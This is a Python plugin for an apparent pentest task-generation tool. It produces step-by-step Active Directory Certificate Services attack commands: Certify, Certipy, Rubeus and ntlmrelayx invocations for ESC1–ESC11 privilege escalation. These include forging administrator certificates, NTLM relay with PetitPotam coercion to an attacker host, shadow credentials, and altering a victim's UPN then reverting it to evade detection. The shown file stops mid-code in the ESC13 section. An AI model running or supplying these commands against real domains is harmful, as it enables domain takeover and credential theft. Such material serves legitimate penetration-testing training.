"""
Active Directory Certificate Services (AD CS) attack plugin

Generates tasks for AD CS enumeration and exploitation including:
- AD CS enumeration (CAs, templates, permissions)
- ESC1-ESC16 certificate template attacks
- Certificate theft (DPAPI, filesystem, registry)
- Certificate-based persistence mechanisms
- NTLM relay to AD CS endpoints

Extracted from HackTricks AD CS documentation
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ADCertificatesPlugin(ServicePlugin):
    """Active Directory Certificate Services exploitation plugin"""

    @property
    def name(self) -> str:
        return "ad-certificates"

    @property
    def default_ports(self) -> List[int]:
        return []  # AD CS uses standard AD ports, detected via service info

    @property
    def service_names(self) -> List[str]:
        return ['ad-cs', 'adcs', 'certificate-services', 'pki']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect AD CS services

        AD CS is detected when Active Directory domain is present
        This plugin is triggered by AD domain context, not port-based
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()

        # Check for AD CS indicators
        if any(indicator in service for indicator in self.service_names):
            return True

        if any(indicator in product for indicator in ['certificate', 'pki', 'adcs']):
            return True

        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> float:
        """Activate ADCS plugin when certificate services detected

        Returns:
            Confidence score (0-100):
            - 100: Perfect match (adcs_detected)
            - 90: High (certificate services indicators)
            - 0: No match
        """
        from ..core.constants import FindingTypes

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match
        if finding_type == FindingTypes.ADCS_DETECTED:
            return 100

        # High - Certificate services
        cert_indicators = ['adcs', 'certificate authority', 'certificate services', 'pki']
        if any(ind in description for ind in cert_indicators):
            return 90

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate AD CS attack task tree"""

        tasks = {
            'id': f'ad-cs-attacks-{port}',
            'name': f'AD Certificate Services Attacks (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: AD CS Enumeration
        tasks['children'].append(self._create_enumeration_tasks(target, port))

        # PHASE 2: Certificate Template Attacks (ESC1-ESC16)
        tasks['children'].append(self._create_esc_attacks(target, port))

        # PHASE 3: Certificate Theft
        tasks['children'].append(self._create_certificate_theft_tasks(target, port))

        # PHASE 4: NTLM Relay Attacks
        tasks['children'].append(self._create_ntlm_relay_tasks(target, port))

        # PHASE 5: Persistence Mechanisms
        tasks['children'].append(self._create_persistence_tasks(target, port))

        return tasks

    def _create_enumeration_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Create AD CS enumeration tasks"""
        return {
            'id': f'adcs-enum-{port}',
            'name': 'AD CS Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'certify-cas-{port}',
                    'name': 'Enumerate Certificate Authorities',
                    'type': 'command',
                    'metadata': {
                        'command': f'Certify.exe cas /domain:{target}',
                        'description': 'Enumerate all Enterprise CAs, trusted roots, and HTTP enrollment endpoints',
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            'cas': 'Enumerate Certificate Authorities mode',
                            '/domain': 'Target AD domain to enumerate',
                        },
                        'success_indicators': [
                            'CA names and DNS names displayed',
                            'Certificate templates listed',
                            'HTTP enrollment endpoints found',
                        ],
                        'failure_indicators': [
                            'Access denied (need domain credentials)',
                            'No CAs found (AD CS not deployed)',
                        ],
                        'next_steps': [
                            'Note CA names for certificate requests',
                            'Check HTTP endpoints for ESC8 vulnerabilities',
                            'Enumerate certificate templates next',
                        ],
                        'alternatives': [
                            f'certipy find -u user@{target} -p password -dc-ip {target}',
                            'certutil.exe -TCAInfo',
                            'Get-CertificationAuthority (PSPKI PowerShell)',
                        ],
                        'notes': 'Certify.exe: https://github.com/GhostPack/Certify | Certipy: https://github.com/ly4k/Certipy',
                        'estimated_time': '30 seconds',
                    }
                },
                {
                    'id': f'certify-find-vulnerable-{port}',
                    'name': 'Find Vulnerable Certificate Templates',
                    'type': 'command',
                    'metadata': {
                        'command': f'Certify.exe find /vulnerable /domain:{target}',
                        'description': 'Identify misconfigured templates vulnerable to ESC1-ESC8 attacks',
                        'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            'find': 'Enumerate certificate templates',
                            '/vulnerable': 'Filter for exploitable misconfigurations only',
                            '/domain': 'Target domain',
                        },
                        'success_indicators': [
                            'Vulnerable templates found (ESC1, ESC2, etc.)',
                            'Template enrollment rights listed',
                            'EKU and SAN configuration shown',
                        ],
                        'failure_indicators': [
                            'No vulnerable templates (well-configured environment)',
                            'Access denied to template enumeration',
                        ],
                        'next_steps': [
                            'Exploit ESC1 if CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled',
                            'Check for ESC4 template write permissions',
                            'Test ESC6 if EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA',
                        ],
                        'alternatives': [
                            f'certipy find -vulnerable -u user@{target} -p password -dc-ip {target}',
                            'Certify.exe find /enrolleeSuppliesSubject (ESC1 only)',
                            'Certify.exe find /clientauth (client-auth templates)',
                        ],
                        'notes': 'ESC = "Escalation Scenario" from Certified Pre-Owned research',
                        'estimated_time': '1-2 minutes',
                    }
                },
                {
                    'id': f'certify-pkiobjects-{port}',
                    'name': 'Enumerate PKI Object Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': f'Certify.exe pkiobjects /domain:{target} /showAdmins',
                        'description': 'Enumerate ACLs on certificate templates, CAs, and PKI containers (ESC4/ESC7 detection)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'ADVANCED'],
                        'flag_explanations': {
                            'pkiobjects': 'Enumerate PKI object ACLs',
                            '/showAdmins': 'Display admin-level permissions',
                        },
                        'success_indicators': [
                            'Template ownership and write permissions shown',
                            'CA ManageCA/ManageCertificates rights displayed',
                            'Writable objects identified',
                        ],
                        'failure_indicators': [
                            'No writable objects found',
                            'Insufficient permissions to read ACLs',
                        ],
                        'next_steps': [
                            'Exploit ESC4 if you have WriteProperty on templates',
                            'Abuse ESC7 if ManageCA or ManageCertificates granted',
                        ],
                        'alternatives': [
                            'Manual LDAP query to CN=Public Key Services,CN=Services,CN=Configuration',
                            'Get-CertificationAuthority | Get-CertificationAuthorityAcl (PSPKI)',
                        ],
                    }
                },
                {
                    'id': f'certipy-find-json-{port}',
                    'name': 'Export Full AD CS Configuration (JSON)',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy find -u user@{target} -p password -dc-ip {target} -json -output adcs.json',
                        'description': 'Export complete AD CS configuration for offline analysis and reporting',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'DOCUMENTATION'],
                        'flag_explanations': {
                            'find': 'Enumerate AD CS',
                            '-u': 'Domain username',
                            '-p': 'Password',
                            '-dc-ip': 'Domain controller IP',
                            '-json': 'JSON output format',
                            '-output': 'Output file path',
                        },
                        'success_indicators': [
                            'JSON file created with full configuration',
                            'All templates, CAs, and permissions exported',
                        ],
                        'alternatives': [
                            'Certify.exe find /json /outfile:adcs.json',
                        ],
                        'notes': 'Essential for OSCP documentation and offline analysis',
                    }
                },
            ]
        }

    def _create_esc_attacks(self, target: str, port: int) -> Dict[str, Any]:
        """Create certificate template attack tasks (ESC1-ESC16)"""
        return {
            'id': f'esc-attacks-{port}',
            'name': 'Certificate Template Attacks (ESC1-ESC16)',
            'type': 'parent',
            'children': [
                self._create_esc1_task(target, port),
                self._create_esc2_task(target, port),
                self._create_esc3_task(target, port),
                self._create_esc4_task(target, port),
                self._create_esc6_task(target, port),
                self._create_esc7_task(target, port),
                self._create_esc8_task(target, port),
                self._create_esc9_task(target, port),
                self._create_esc10_task(target, port),
                self._create_esc11_task(target, port),
                self._create_esc13_task(target, port),
                self._create_esc14_task(target, port),
                self._create_esc15_task(target, port),
                self._create_esc16_task(target, port),
            ]
        }

    def _create_esc1_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC1: Enrollee supplies subject (SAN spoofing)"""
        return {
            'id': f'esc1-attack-{port}',
            'name': 'ESC1: Enrollee Supplies Subject (SAN Spoofing)',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc1-request-cert-{port}',
                    'name': 'Request Certificate with Arbitrary SAN',
                    'type': 'command',
                    'metadata': {
                        'command': f'Certify.exe request /ca:dc.{target}\\CA-NAME /template:VulnTemplate /altname:administrator@{target}',
                        'description': 'Request certificate with arbitrary UPN to impersonate administrator',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                        'flag_explanations': {
                            'request': 'Request new certificate',
                            '/ca': 'CA server and CA name (format: SERVER\\CA-NAME)',
                            '/template': 'Vulnerable certificate template name',
                            '/altname': 'Subject Alternative Name (UPN) - target user to impersonate',
                        },
                        'success_indicators': [
                            'Certificate request successful',
                            '.pem file generated with admin UPN',
                            'Private key saved',
                        ],
                        'failure_indicators': [
                            'Template not found (wrong name)',
                            'SAN not allowed (template misconfigured)',
                            'Access denied (no enrollment rights)',
                        ],
                        'next_steps': [
                            'Convert .pem to .pfx: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx',
                            'Authenticate with certificate: Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt',
                            'Or use Certipy: certipy auth -pfx administrator.pfx -dc-ip {target}',
                        ],
                        'alternatives': [
                            f'certipy req -u user@{target} -p password -ca CA-NAME -template VulnTemplate -upn administrator@{target}',
                            'Include SID for post-2022 environments: /sid:S-1-5-21-...-500',
                        ],
                        'notes': 'ESC1 requires: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled + Client Authentication EKU + No manager approval',
                        'estimated_time': '2-3 minutes',
                    }
                },
                {
                    'id': f'esc1-auth-{port}',
                    'name': 'Authenticate with ESC1 Certificate',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy auth -pfx administrator.pfx -dc-ip {target}',
                        'description': 'Obtain TGT and NT hash using forged certificate',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            'auth': 'Authenticate using certificate',
                            '-pfx': 'Certificate file path',
                            '-dc-ip': 'Domain controller IP',
                        },
                        'success_indicators': [
                            'TGT obtained for administrator',
                            'NT hash recovered (UnPAC the hash)',
                            '.ccache file saved',
                        ],
                        'alternatives': [
                            'Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt',
                        ],
                        'notes': 'Certificate valid until expiration (typically 1 year) regardless of password changes',
                    }
                },
            ]
        }

    def _create_esc2_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC2: Any Purpose EKU or no EKU"""
        return {
            'id': f'esc2-attack-{port}',
            'name': 'ESC2: Any Purpose EKU Abuse',
            'type': 'command',
            'metadata': {
                'command': f'Certify.exe request /ca:dc.{target}\\CA-NAME /template:AnyPurposeTemplate',
                'description': 'Request certificate with Any Purpose EKU (OID 2.5.29.37.0) or no EKU for arbitrary use',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'flag_explanations': {
                    '/template': 'Template with Any Purpose EKU or blank EKU (SubCA)',
                },
                'success_indicators': [
                    'Certificate with Any Purpose EKU issued',
                    'Can be used for client auth, code signing, etc.',
                ],
                'failure_indicators': [
                    'EKU restrictions enforced',
                ],
                'next_steps': [
                    'Use certificate for client authentication (same as ESC1)',
                    'Or sign new certificates if SubCA template',
                ],
                'alternatives': [
                    f'certipy req -u user@{target} -p password -ca CA-NAME -template AnyPurposeTemplate',
                ],
                'notes': 'ESC2: Any Purpose EKU allows certificate use for any purpose. SubCA (no EKU) can sign new certificates but won\'t work for domain auth unless in NTAuthCertificates',
            }
        }

    def _create_esc3_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC3: Enrollment agent abuse"""
        return {
            'id': f'esc3-attack-{port}',
            'name': 'ESC3: Certificate Request Agent (Enrollment Agent)',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc3-request-agent-{port}',
                    'name': 'Request Enrollment Agent Certificate',
                    'type': 'command',
                    'metadata': {
                        'command': f'Certify.exe request /ca:dc.{target}\\CA-NAME /template:EnrollmentAgent',
                        'description': 'Request Certificate Request Agent certificate (EKU 1.3.6.1.4.1.311.20.2.1)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '/template': 'Template with Certificate Request Agent EKU',
                        },
                        'success_indicators': [
                            'Enrollment agent certificate issued',
                            '.pfx file created',
                        ],
                        'next_steps': [
                            'Use agent cert to request certificates on behalf of other users',
                        ],
                        'alternatives': [
                            f'certipy req -u user@{target} -p password -ca CA-NAME -template EnrollmentAgent',
                        ],
                        'notes': 'Enrollment Agent = Certificate Request Agent EKU',
                    }
                },
                {
                    'id': f'esc3-onbehalfof-{port}',
                    'name': 'Request Certificate On Behalf Of Target',
                    'type': 'command',
                    'metadata': {
                        'command': f'Certify.exe request /ca:dc.{target}\\CA-NAME /template:User /onbehalfof:DOMAIN\\administrator /enrollcert:agent.pfx /enrollcertpwd:password',
                        'description': 'Use enrollment agent certificate to request User certificate for administrator',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                        'flag_explanations': {
                            '/onbehalfof': 'Target user to request certificate for (domain\\username)',
                            '/enrollcert': 'Enrollment agent certificate (.pfx)',
                            '/enrollcertpwd': 'Agent certificate password',
                        },
                        'success_indicators': [
                            'Certificate issued for target user',
                            'Administrator certificate obtained',
                        ],
                        'next_steps': [
                            'Authenticate as administrator with issued certificate',
                        ],
                        'alternatives': [
                            f'certipy req -u user@{target} -p password -ca CA-NAME -template User -on-behalf-of DOMAIN\\administrator -pfx agent.pfx',
                        ],
                        'notes': 'CA default: "Do not restrict enrollment agents" (allows anyone to enroll for anyone)',
                    }
                },
            ]
        }

    def _create_esc4_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC4: Vulnerable certificate template access control"""
        return {
            'id': f'esc4-attack-{port}',
            'name': 'ESC4: Template Write Permissions',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc4-overwrite-template-{port}',
                    'name': 'Overwrite Template to Make Vulnerable',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy template -u user@{target} -p password -template SafeTemplate -save-old',
                        'description': 'Overwrite template configuration to enable ESC1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            'template': 'Modify certificate template',
                            '-template': 'Template name to modify',
                            '-save-old': 'Save original configuration for restoration',
                        },
                        'success_indicators': [
                            'Template configuration saved to JSON',
                            'Template now vulnerable to ESC1',
                        ],
                        'failure_indicators': [
                            'Access denied (no WriteProperty/Owner rights)',
                        ],
                        'next_steps': [
                            'Exploit ESC1 with modified template',
                            'Restore original config after: certipy template -template SafeTemplate -configuration SafeTemplate.json',
                        ],
                        'alternatives': [
                            'Manual: Modify template via ADSI Edit or certificate template MMC',
                            'Set msPKI-Certificate-Name-Flag to 1 for ENROLLEE_SUPPLIES_SUBJECT',
                        ],
                        'notes': 'Requires WriteProperty, WriteOwner, WriteDacl, or FullControl on template object',
                    }
                },
            ]
        }

    def _create_esc6_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag"""
        return {
            'id': f'esc6-attack-{port}',
            'name': 'ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc6-check-flag-{port}',
                    'name': 'Check EDITF_ATTRIBUTESUBJECTALTNAME2 Flag',
                    'type': 'command',
                    'metadata': {
                        'command': f'certutil -config "{target}\\CA-NAME" -getreg "policy\\EditFlags"',
                        'description': 'Check if CA allows user-defined SANs in all certificate requests',
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-config': 'CA server and name',
                            '-getreg': 'Get registry value',
                            'policy\\EditFlags': 'Policy module edit flags',
                        },
                        'success_indicators': [
                            'EDITF_ATTRIBUTESUBJECTALTNAME2 flag present (0x40000)',
                            'Vulnerable to ESC6',
                        ],
                        'failure_indicators': [
                            'Flag not set (secure configuration)',
                        ],
                        'alternatives': [
                            f'reg.exe query \\\\{target}\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\CA-NAME\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\ /v EditFlags',
                            'Certify.exe find (flags shown in CA enumeration)',
                        ],
                        'notes': 'EDITF_ATTRIBUTESUBJECTALTNAME2 allows SAN in any template (even User template)',
                    }
                },
                {
                    'id': f'esc6-exploit-{port}',
                    'name': 'Exploit ESC6 with User Template',
                    'type': 'command',
                    'metadata': {
                        'command': f'Certify.exe request /ca:dc.{target}\\CA-NAME /template:User /altname:administrator@{target}',
                        'description': 'Request certificate from ANY template with administrator SAN',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                        'flag_explanations': {
                            '/template:User': 'Standard User template (does not normally allow SAN)',
                            '/altname': 'SAN override (works due to CA flag)',
                        },
                        'success_indicators': [
                            'Administrator certificate issued from User template',
                        ],
                        'next_steps': [
                            'Authenticate as administrator with certificate',
                        ],
                        'alternatives': [
                            f'certipy req -u user@{target} -p password -ca CA-NAME -template User -upn administrator@{target}',
                        ],
                        'notes': 'Post-May 2022 patches: Requires ESC10 (weak certificate mappings) to work. SID from requester, not SAN.',
                    }
                },
            ]
        }

    def _create_esc7_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC7: CA permissions abuse"""
        return {
            'id': f'esc7-attack-{port}',
            'name': 'ESC7: CA Access Control (ManageCA/ManageCertificates)',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc7-manageca-{port}',
                    'name': 'ESC7 Attack 1: ManageCA + Enable SubCA',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'esc7-add-officer-{port}',
                            'name': 'Grant Manage Certificates Permission',
                            'type': 'command',
                            'metadata': {
                                'command': f'certipy ca -ca CA-NAME -add-officer john -u john@{target} -p password',
                                'description': 'Use ManageCA to grant yourself ManageCertificates (certificate manager)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    'ca': 'CA operations command',
                                    '-ca': 'CA name',
                                    '-add-officer': 'Add user as certificate manager/officer',
                                },
                                'success_indicators': [
                                    'Officer successfully added',
                                    'ManageCertificates permission granted',
                                ],
                            }
                        },
                        {
                            'id': f'esc7-enable-subca-{port}',
                            'name': 'Enable SubCA Template',
                            'type': 'command',
                            'metadata': {
                                'command': f'certipy ca -ca CA-NAME -enable-template SubCA -u john@{target} -p password',
                                'description': 'Enable SubCA template on the CA (if not already enabled)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    '-enable-template': 'Enable certificate template on CA',
                                },
                                'success_indicators': [
                                    'SubCA template enabled',
                                ],
                                'notes': 'SubCA template is vulnerable to ESC1 but requires admin enrollment (we will fail first, then approve)',
                            }
                        },
                        {
                            'id': f'esc7-request-subca-{port}',
                            'name': 'Request SubCA Certificate (Will Fail)',
                            'type': 'command',
                            'metadata': {
                                'command': f'certipy req -u john@{target} -p password -ca CA-NAME -template SubCA -upn administrator@{target}',
                                'description': 'Request SubCA certificate with administrator UPN (will be denied but request ID saved)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'success_indicators': [
                                    'Request denied (expected)',
                                    'Request ID returned (note this ID)',
                                    'Private key saved to .key file',
                                ],
                                'next_steps': [
                                    'Issue the failed request using ManageCertificates permission',
                                ],
                                'notes': 'Save the request ID and private key for next step',
                            }
                        },
                        {
                            'id': f'esc7-issue-request-{port}',
                            'name': 'Issue Failed Request',
                            'type': 'command',
                            'metadata': {
                                'command': f'certipy ca -ca CA-NAME -issue-request <REQUEST_ID> -u john@{target} -p password',
                                'description': 'Use ManageCertificates to issue the failed certificate request',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                                'flag_explanations': {
                                    '-issue-request': 'Approve and issue a pending/failed certificate request',
                                },
                                'success_indicators': [
                                    'Certificate successfully issued',
                                ],
                                'next_steps': [
                                    'Retrieve issued certificate with request ID',
                                ],
                            }
                        },
                        {
                            'id': f'esc7-retrieve-cert-{port}',
                            'name': 'Retrieve Issued Certificate',
                            'type': 'command',
                            'metadata': {
                                'command': f'certipy req -u john@{target} -p password -ca CA-NAME -retrieve <REQUEST_ID>',
                                'description': 'Download issued certificate using request ID',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    '-retrieve': 'Retrieve issued certificate by request ID',
                                },
                                'success_indicators': [
                                    'Administrator certificate retrieved',
                                    '.pfx file created with private key',
                                ],
                                'next_steps': [
                                    'Authenticate as administrator',
                                ],
                            }
                        },
                    ]
                },
            ]
        }

    def _create_esc8_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC8: NTLM relay to AD CS HTTP endpoints"""
        return {
            'id': f'esc8-attack-{port}',
            'name': 'ESC8: NTLM Relay to AD CS HTTP Endpoints',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc8-relay-certipy-{port}',
                    'name': 'NTLM Relay to AD CS Web Enrollment',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy relay -ca {target}',
                        'description': 'Start NTLM relay to capture authentication and request certificates',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'NOISY'],
                        'flag_explanations': {
                            'relay': 'Start NTLM relay server',
                            '-ca': 'Target CA web enrollment endpoint (http://ca.domain.local/certsrv/)',
                        },
                        'success_indicators': [
                            'Relay server listening on 0.0.0.0:445',
                            'Authentication captured',
                            'Certificate requested for victim',
                        ],
                        'failure_indicators': [
                            'Connection refused (web enrollment not enabled)',
                            'HTTPS with EPA enabled (channel binding blocks relay)',
                        ],
                        'next_steps': [
                            'Coerce authentication from target: PetitPotam, PrinterBug, etc.',
                            'Use issued certificate to authenticate as victim',
                        ],
                        'alternatives': [
                            f'ntlmrelayx.py -t http://{target}/certsrv/certfnsh.asp -smb2support --adcs --template Machine',
                        ],
                        'notes': 'Works against /certsrv/ (HTTP), CES, CEP, NDES. For DCs, specify -template DomainController',
                        'estimated_time': 'Ongoing (until coercion succeeds)',
                    }
                },
                {
                    'id': f'esc8-coerce-{port}',
                    'name': 'Coerce Authentication (PetitPotam)',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 PetitPotam.py -u user -p password <ATTACKER_IP> {target}',
                        'description': 'Force domain controller to authenticate to attacker relay server',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'NOISY'],
                        'flag_explanations': {
                            '<ATTACKER_IP>': 'Your relay server IP',
                            target: 'Target DC or machine to coerce',
                        },
                        'success_indicators': [
                            'Authentication coerced',
                            'Relay captures authentication and requests certificate',
                        ],
                        'alternatives': [
                            'PrinterBug: dementor.py',
                            'SpoolSample.exe',
                        ],
                        'notes': 'PetitPotam: https://github.com/ly4k/PetitPotam',
                    }
                },
            ]
        }

    def _create_esc9_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC9: No security extension (CT_FLAG_NO_SECURITY_EXTENSION)"""
        return {
            'id': f'esc9-attack-{port}',
            'name': 'ESC9: No Security Extension Abuse',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc9-shadow-creds-{port}',
                    'name': 'Obtain Victim Hash via Shadow Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy shadow auto -u john@{target} -p password -account jane',
                        'description': 'Use GenericWrite to add shadow credentials and obtain hash',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            'shadow': 'Shadow Credentials attack',
                            'auto': 'Automated mode (add key, authenticate, retrieve hash)',
                            '-account': 'Target account with GenericWrite permissions',
                        },
                        'success_indicators': [
                            'Shadow credentials added',
                            'NT hash retrieved',
                        ],
                    }
                },
                {
                    'id': f'esc9-modify-upn-{port}',
                    'name': 'Modify Victim UPN to Administrator',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy account update -u john@{target} -p password -user jane -upn Administrator',
                        'description': 'Change victim UPN to "Administrator" (without @domain, avoids constraint)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            'account update': 'Modify AD account attributes',
                            '-user': 'Target user to modify',
                            '-upn': 'New UPN value (omit domain to avoid conflict)',
                        },
                        'success_indicators': [
                            'UPN updated to Administrator',
                        ],
                        'notes': 'Administrator (no domain) != Administrator@domain.local (no constraint violation)',
                    }
                },
                {
                    'id': f'esc9-request-cert-{port}',
                    'name': 'Request ESC9 Vulnerable Template',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy req -u jane@{target} -hashes <HASH> -ca CA-NAME -template ESC9Template',
                        'description': 'Request certificate with CT_FLAG_NO_SECURITY_EXTENSION (no SID extension)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'success_indicators': [
                            'Certificate issued with UPN "Administrator"',
                            'No object SID in certificate',
                        ],
                        'next_steps': [
                            'Revert victim UPN to original',
                            'Authenticate with certificate (will map to Administrator@domain.local)',
                        ],
                    }
                },
                {
                    'id': f'esc9-revert-upn-{port}',
                    'name': 'Revert Victim UPN',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy account update -u john@{target} -p password -user jane -upn jane@{target}',
                        'description': 'Restore original UPN to avoid detection',
                        'tags': ['OSCP:MEDIUM'],
                    }
                },
                {
                    'id': f'esc9-auth-{port}',
                    'name': 'Authenticate as Administrator',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy auth -pfx administrator.pfx -domain {target}',
                        'description': 'Authenticate using certificate (maps to Administrator@domain.local via UPN)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PRIVESC'],
                        'flag_explanations': {
                            '-domain': 'Required since certificate lacks domain in UPN',
                        },
                        'success_indicators': [
                            'TGT for Administrator@domain.local',
                            'NT hash obtained',
                        ],
                        'notes': 'ESC9 requires StrongCertificateBindingEnforcement != 2 (default is 1)',
                    }
                },
            ]
        }

    def _create_esc10_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC10: Weak certificate mappings"""
        return {
            'id': f'esc10-attack-{port}',
            'name': 'ESC10: Weak Certificate Mappings',
            'type': 'command',
            'metadata': {
                'command': f'# Check registry: StrongCertificateBindingEnforcement=0 or CertificateMappingMethods includes UPN (0x4)',
                'description': 'Abuse weak certificate mapping (similar to ESC9 but for any template)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'success_indicators': [
                    'StrongCertificateBindingEnforcement = 0',
                    'Or CertificateMappingMethods includes UPN bit (0x4)',
                ],
                'next_steps': [
                    'Case 1: If StrongCertificateBindingEnforcement=0, follow ESC9 workflow with any template',
                    'Case 2: If UPN mapping enabled, target accounts without userPrincipalName (machines, built-in Administrator)',
                ],
                'alternatives': [
                    'Check DC registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\StrongCertificateBindingEnforcement',
                    'HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\Schannel\\CertificateMappingMethods',
                ],
                'notes': 'ESC10 Case 2: Set victim UPN to DC$@domain.local, request cert, use certipy auth -ldap-shell for RBCD',
            }
        }

    def _create_esc11_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC11: Relaying NTLM to ICPR"""
        return {
            'id': f'esc11-attack-{port}',
            'name': 'ESC11: NTLM Relay to ICPR (RPC)',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc11-check-{port}',
                    'name': 'Check if Enforce Encryption Disabled',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy find -u user@{target} -p password -dc-ip {target} -stdout | grep "Enforce Encryption for Requests"',
                        'description': 'Check if CA has IF_ENFORCEENCRYPTICERTREQUEST disabled (vulnerable to ESC11)',
                        'tags': ['OSCP:MEDIUM', 'ENUM'],
                        'success_indicators': [
                            'Enforce Encryption for Requests: Disabled',
                            'ESC11 vulnerability present',
                        ],
                    }
                },
                {
                    'id': f'esc11-relay-{port}',
                    'name': 'NTLM Relay to RPC (ICPR)',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy relay -target "rpc://{target}" -ca CA-NAME -dc-ip {target}',
                        'description': 'Relay NTLM to RPC certificate enrollment interface (ICPR)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'NOISY'],
                        'flag_explanations': {
                            '-target': 'RPC endpoint (rpc://dc.domain.local)',
                            '-ca': 'CA name',
                        },
                        'success_indicators': [
                            'Relay server listening',
                            'Certificate requested for relayed account',
                        ],
                        'next_steps': [
                            'Coerce authentication (PetitPotam, etc.)',
                            'For DCs: specify -template DomainController',
                        ],
                        'alternatives': [
                            'ntlmrelayx.py -t rpc://dc.domain.local -rpc-mode ICPR -icpr-ca-name CA-NAME',
                        ],
                        'notes': 'ESC11: RPC enrollment without encryption (IF_ENFORCEENCRYPTICERTREQUEST not set)',
                    }
                },
            ]
        }

    def _create_esc13_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC13: OID group link abuse"""
        return {
            'id': f'esc13-attack-{port}',
            'name': 'ESC13: OID Group Link Abuse',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc13-find-oid-{port}',
                    'name': 'Find OID to Group Link',
                    'type': 'command',
                    'metadata': {
                        'command': 'Check-ADCSESC13.ps1',
                        'description': 'Enumerate OID objects linked to AD groups (msDS-OIDToGroupLink)',
                        'tags': ['OSCP:LOW', 'ENUM'],
                        'success_indicators': [
                            'OID linked to privileged group found',
                            'Certificate template using that OID found',
                        ],
                        'notes': 'PowerShell script: https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1',
                    }
                },
                {
                    'id': f'esc13-request-{port}',
